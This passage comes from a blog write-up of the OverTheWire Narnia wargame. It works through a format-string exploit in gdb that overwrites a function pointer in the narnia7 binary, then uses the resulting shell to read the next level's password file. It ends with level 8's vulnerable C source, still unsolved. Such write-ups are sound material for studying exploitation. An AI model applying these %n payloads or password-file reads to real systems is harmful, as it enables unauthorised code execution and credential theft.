<span class="go">0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961</span>
<span class="go">0xffffd630:	0x38343038	0x36306536	0x36313631	0x36313631</span>
<span class="go">0xffffd640:	0x36323632	0x00323632	0x00000000	0x00000000</span>
<span class="go">0xffffd650:	0x00000000	0x00000000	0x00000000	0x00000000</span>
<span class="go">0xffffd660:	0x00000000	0x00000000	0x00000000	0x00000000</span>
<span class="go">0xffffd670:	0x00000000	0x00000000	0x00000000	0x00000000</span>
<span class="go">0xffffd680:	0x00000000	0x00000000	0x00000000	0x00000000</span>
</code></pre></div>
</p>

<p>So at <code>0xffffd60c</code> is the address of <code>goodfunction</code>. We need to overwrite that
to point to <code>0x8048706</code>, our <code>hackedfunction</code>. So as before in <a href="http://unlogic.co.uk/2015/04/10/solving-narnia-part-2/#level-05">level 05</a>
we use <code>%n</code> to try and overwrite this value.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">(gdb) r $(python -c &quot;print &#39;aaaa\x0c\xd6\xff\xff&#39; + &#39;%x&#39;*6 + &#39;%n&#39;&quot;)</span>

<span class="go">Starting program: /games/narnia/narnia7 $(python -c &quot;print &#39;aaaa\x0c\xd6\xff\xff&#39; + &#39;%x&#39;*6 + &#39;%n&#39;&quot;)</span>
<span class="go">goodfunction() = 0x80486e0</span>
<span class="go">hackedfunction() = 0x8048706</span>

<span class="go">before : ptrf() = 0x80486e0 (0xffffd60c)</span>
<span class="go">I guess you want to come to the hackedfunction...</span>

<span class="go">Breakpoint 1, 0x08048685 in vuln ()</span>
<span class="go">(gdb) x/40wx $esp</span>
<span class="go">0xffffd5f0:	0xffffd610	0x00000080	0xffffd8a2	0x08048238</span>
<span class="go">0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x0000002f</span>
<span class="go">0xffffd610:	0x61616161	0xffffd60c	0x38343038	0x66383332</span>
<span class="go">0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961</span>
<span class="go">0xffffd630:	0x38343038	0x36306536	0x36313631	0x00313631</span>
<span class="go">0xffffd640:	0x00000000	0x00000000	0x00000000	0x00000000</span>
<span class="go">0xffffd650:	0x00000000	0x00000000	0x00000000	0x00000000</span>
<span class="go">0xffffd660:	0x00000000	0x00000000	0x00000000	0x00000000</span>
<span class="go">0xffffd670:	0x00000000	0x00000000	0x00000000	0x00000000</span>
<span class="go">0xffffd680:	0x00000000	0x00000000	0x00000000	0x00000000</span>
<span class="go">(gdb)</span>
</code></pre></div>
</p>

<p>The value of <em>2f</em> at <code>0xffffd60c</code> shows us that our overwrite was successful
and we wrote the value of <em>47</em>. We need to write <code>0x8048706</code> which is <em>134514438</em> in decimal.
So let&rsquo;s add our <code>%d</code> in and remember to adjust the number of <code>%x</code>s too, so we can see
how much padding we need</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">(gdb) r $(python -c &quot;print &#39;aaaa\x0c\xd6\xff\xff&#39; + &#39;%x&#39;*5 + &#39;%d%n&#39;&quot;)</span>
<span class="go">The program being debugged has been started already.</span>
<span class="go">Start it from the beginning? (y or n) y</span>

<span class="go">Starting program: /games/narnia/narnia7 $(python -c &quot;print &#39;aaaa\x0c\xd6\xff\xff&#39; + &#39;%x&#39;*5 + &#39;%d%n&#39;&quot;)</span>
<span class="go">goodfunction() = 0x80486e0</span>
<span class="go">hackedfunction() = 0x8048706</span>

<span class="go">before : ptrf() = 0x80486e0 (0xffffd60c)</span>
<span class="go">I guess you want to come to the hackedfunction...</span>

<span class="go">Breakpoint 1, 0x08048685 in vuln ()</span>
<span class="go">(gdb) x/40wx $esp</span>
<span class="go">0xffffd5f0:	0xffffd610	0x00000080	0xffffd8a2	0x08048238</span>
<span class="go">0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x00000031</span>
<span class="go">0xffffd610:	0x61616161	0xffffd60c	0x38343038	0x66383332</span>
<span class="go">0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961</span>
<span class="go">0xffffd630:	0x38343038	0x31306536	0x37333336	0x37383137</span>
<span class="go">0xffffd640:	0x00000033	0x00000000	0x00000000	0x00000000</span>
<span class="go">0xffffd650:	0x00000000	0x00000000	0x00000000	0x00000000</span>
<span class="go">0xffffd660:	0x00000000	0x00000000	0x00000000	0x00000000</span>
<span class="go">0xffffd670:	0x00000000	0x00000000	0x00000000	0x00000000</span>
<span class="go">0xffffd680:	0x00000000	0x00000000	0x00000000	0x00000000</span>
</code></pre></div>
</p>

<p>Ok, so <code>0x8048706 - 0x00000031 = 0x80486d6</code> or <em>134514389</em> in decimal.
Let&rsquo;s see if I&rsquo;m right</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">(gdb) r $(python -c &quot;print &#39;aaaa\x0c\xd6\xff\xff&#39; + &#39;%x&#39;*5 + &#39;%134514389d%n&#39;&quot;)</span>
<span class="go">The program being debugged has been started already.</span>
<span class="go">Start it from the beginning? (y or n) y</span>

<span class="go">Starting program: /games/narnia/narnia7 $(python -c &quot;print &#39;aaaa\x0c\xd6\xff\xff&#39; + &#39;%x&#39;*5 + &#39;%134514389d%n&#39;&quot;)</span>
<span class="go">goodfunction() = 0x80486e0</span>
<span class="go">hackedfunction() = 0x8048706</span>

<span class="go">before : ptrf() = 0x80486e0 (0xffffd60c)</span>
<span class="go">I guess you want to come to the hackedfunction...</span>

<span class="go">Breakpoint 1, 0x08048685 in vuln ()</span>
<span class="go">(gdb) x/40wx $esp</span>
<span class="go">0xffffd5f0:	0xffffd610	0x00000080	0xffffd899	0x08048238</span>
<span class="go">0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x080486fc</span>
<span class="go">0xffffd610:	0x61616161	0xffffd60c	0x38343038	0x66383332</span>
<span class="go">0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961</span>
<span class="go">0xffffd630:	0x38343038	0x20306536	0x20202020	0x20202020</span>
<span class="go">0xffffd640:	0x20202020	0x20202020	0x20202020	0x20202020</span>
<span class="go">0xffffd650:	0x20202020	0x20202020	0x20202020	0x20202020</span>
<span class="go">0xffffd660:	0x20202020	0x20202020	0x20202020	0x20202020</span>
<span class="go">0xffffd670:	0x20202020	0x20202020	0x20202020	0x20202020</span>
<span class="go">0xffffd680:	0x20202020	0x20202020	0x20202020	0x00202020</span>
</code></pre></div>
</p>

<p>Still a little off. Adjusting the value again</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">(gdb) r $(python -c &quot;print &#39;aaaa\x0c\xd6\xff\xff&#39; + &#39;%x&#39;*5 + &#39;%134514399d%n&#39;&quot;)</span>
<span class="go">The program being debugged has been started already.</span>
<span class="go">Start it from the beginning? (y or n) y</span>

<span class="go">Starting program: /games/narnia/narnia7 $(python -c &quot;print &#39;aaaa\x0c\xd6\xff\xff&#39; + &#39;%x&#39;*5 + &#39;%134514399d%n&#39;&quot;)</span>
<span class="go">goodfunction() = 0x80486e0</span>
<span class="go">hackedfunction() = 0x8048706</span>

<span class="go">before : ptrf() = 0x80486e0 (0xffffd60c)</span>
<span class="go">I guess you want to come to the hackedfunction...</span>

<span class="go">Breakpoint 1, 0x08048685 in vuln ()</span>
<span class="go">(gdb) x/40wx $esp</span>
<span class="go">0xffffd5f0:	0xffffd610	0x00000080	0xffffd899	0x08048238</span>
<span class="go">0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x08048706</span>
<span class="go">0xffffd610:	0x61616161	0xffffd60c	0x38343038	0x66383332</span>
<span class="go">0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961</span>
<span class="go">0xffffd630:	0x38343038	0x20306536	0x20202020	0x20202020</span>
<span class="go">0xffffd640:	0x20202020	0x20202020	0x20202020	0x20202020</span>
<span class="go">0xffffd650:	0x20202020	0x20202020	0x20202020	0x20202020</span>
<span class="go">0xffffd660:	0x20202020	0x20202020	0x20202020	0x20202020</span>
<span class="go">0xffffd670:	0x20202020	0x20202020	0x20202020	0x20202020</span>
<span class="go">0xffffd680:	0x20202020	0x20202020	0x20202020	0x00202020</span>
<span class="go">(gdb) c</span>
<span class="go">Continuing.</span>
<span class="go">Way to go!!!!$</span>
</code></pre></div>
</p>

<p>And now we need to run it from the commandline to actually get a proper setuid shell</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">narnia7@melinda:/narnia$</span> .//narnia7 <span class="k">$(</span>python -c <span class="s2">&quot;print &#39;aaaa\x0c\xd6\xff\xff&#39; + &#39;%x&#39;*5 + &#39;%134514399d%n&#39;&quot;</span><span class="k">)</span>
<span class="go">goodfunction() = 0x80486e0</span>
<span class="go">hackedfunction() = 0x8048706</span>

<span class="go">before : ptrf() = 0x80486e0 (0xffffd61c)</span>
<span class="go">I guess you want to come to the hackedfunction...</span>
<span class="go">Welcome to the goodfunction, but i said the Hackedfunction..</span>
<span class="gp">narnia7@melinda:/narnia$</span> .//narnia7 <span class="k">$(</span>python -c <span class="s2">&quot;print &#39;aaaa\x1c\xd6\xff\xff&#39; + &#39;%x&#39;*5 + &#39;%134514399d%n&#39;&quot;</span><span class="k">)</span>
<span class="go">goodfunction() = 0x80486e0</span>
<span class="go">hackedfunction() = 0x8048706</span>

<span class="go">before : ptrf() = 0x80486e0 (0xffffd61c)</span>
<span class="go">I guess you want to come to the hackedfunction...</span>
<span class="go">Way to go!!!!$ whomai</span>
<span class="go">/bin/sh: 1: whomai: not found</span>
<span class="gp">$</span> whoami
<span class="go">narnia8</span>
<span class="gp">$</span> cat /etc/narnia_pass/narnia8 
<span class="go">[password]</span>
</code></pre></div>
</p>

<p>Notice that the address of <code>ptrf</code> is not the same in the shell :)</p>

<h2 id="level-08:100abf89ce6a11fb3cfc3f5a51e9cb94">Level 08</h2>

<p><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><code class="language-c" data-lang="c"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30</code></pre></div></td><td class="code"><div class="highlight"><pre><span class="cp">#include &lt;stdio.h&gt;</span>
<span class="cp">#include &lt;stdlib.h&gt;</span>
<span class="cp">#include &lt;string.h&gt;</span>
<span class="c1">// gcc&#39;s variable reordering fucked things up</span>
<span class="c1">// to keep the level in its old style i am </span>
<span class="c1">// making &quot;i&quot; global unti i find a fix </span>
<span class="c1">// -morla </span>
<span class="kt">int</span> <span class="n">i</span><span class="p">;</span> 

<span class="kt">void</span> <span class="nf">func</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">b</span><span class="p">){</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">blah</span><span class="o">=</span><span class="n">b</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">bok</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
    <span class="c1">//int i=0;</span>
    
    <span class="n">memset</span><span class="p">(</span><span class="n">bok</span><span class="p">,</span> <span class="sc">&#39;\0&#39;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">bok</span><span class="p">));</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">blah</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="n">bok</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">blah</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">bok</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
        
    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>       
        <span class="n">func</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="k">else</span>    
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s argument</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</td></tr></table></p>

<p>I&rsquo;m struggling with this, and rather than delay the whole post because of the last
level, I decided to post anyway. I&rsquo;ll update this when I have this figured out.</p>

<p>Sorry.</p>

      </article>

      <p class="post-meta">Tags:&nbsp;
        
            
            <a href="http://unlogic.co.uk//tags/ctf">ctf</a>
        
            ,&nbsp;
            <a href="http://unlogic.co.uk//tags/wargame">wargame</a>
        
            ,&nbsp;
            <a href="http://unlogic.co.uk//tags/overthewire">overthewire</a>
        
            ,&nbsp;
            <a href="http://unlogic.co.uk//tags/narnia">narnia</a>
        
            ,&nbsp;
            <a href="http://unlogic.co.uk//tags/security">security</a>
        
      </p>

      
<div id="disqus_thread">
  <script type="text/javascript">
     var disqus_shortname = "unlogic";
     var disqus_identifier = "\/2015\/04\/13\/solving-narnia-part-2\/";

     (function() {
       var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
       dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
       (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
     })();
  </script>
</div>


    </div>
  </div>
</div>
    <footer class="footer">
      <div class="p2 wrap">
        <div class="measure mt1 center">
      <nav class="social-icons icons">
<a class="fa fa-rss rss" href="http://unlogic.co.uk/index.xml"></a>

<a class="fa fa-twitter twitter" href="https://twitter.com/binaryheadache"></a>

</nav>

          <small>
            Copyright &#169; 2015<br>
            Powered by <a href="http://gohugo.io/" target="_blank">Hugo</a> &amp; <a href="https://github.com/azmelanar/hugo-theme-pixyll" target="_blank">Pixyll</a>
          </small>
        </div>
      </div>
    </footer>

    
    <script src="http://unlogic.co.uk/js/highlight.pack.js"></script>
    <script>hljs.initHighlightingOnLoad();</script>

    
    


</body>
</html>

